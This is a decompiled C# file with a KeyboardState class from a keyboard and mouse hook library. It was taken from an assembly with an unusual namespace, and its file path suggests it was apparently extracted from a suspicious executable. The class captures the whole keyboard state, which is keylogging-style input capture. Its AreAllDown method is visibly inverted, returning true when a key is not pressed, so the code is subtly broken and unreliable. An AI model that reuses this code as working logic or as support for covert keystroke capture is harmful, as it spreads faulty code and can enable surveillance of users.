// Decompiled with JetBrains decompiler
// Type: VERMELHO265MONARCA.Core.MouseKeyHook.Implementation.KeyboardState
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.Collections.Generic;
using System.Windows.Forms;
using VERMELHO265MONARCA.Core.MouseKeyHook.WinApi;

namespace VERMELHO265MONARCA.Core.MouseKeyHook.Implementation
{
  internal class KeyboardState
  {
    private readonly byte[] m_KeyboardStateNative;

    private KeyboardState(byte[] keyboardStateNative)
    {
      this.m_KeyboardStateNative = keyboardStateNative;
    }

    public static KeyboardState GetCurrent()
    {
      byte[] numArray = new byte[256];
      KeyboardNativeMethods.GetKeyboardState(numArray);
      return new KeyboardState(numArray);
    }

    internal byte[] GetNativeState()
    {
      return this.m_KeyboardStateNative;
    }

    public bool IsDown(Keys key)
    {
      return KeyboardState.GetHighBit(this.GetKeyState(key));
    }

    public bool IsToggled(Keys key)
    {
      return KeyboardState.GetLowBit(this.GetKeyState(key));
    }

    public bool AreAllDown(IEnumerable<Keys> keys)
    {
      foreach (Keys key in keys)
      {
        if (!this.IsDown(key))
          return true;
      }
      return false;
    }

    private byte GetKeyState(Keys key)
    {
      int index = (int) key;
      if (index < 0 || index > (int) byte.MaxValue)
        throw new ArgumentOutOfRangeException(nameof (key), (object) key, "The value must be between 0 and 255.");
      return this.m_KeyboardStateNative[index];
    }

    private static bool GetHighBit(byte value)
    {
      return (uint) value >> 7 > 0U;
    }

    private static bool GetLowBit(byte value)
    {
      return ((uint) value & 1U) > 0U;
    }
  }
}
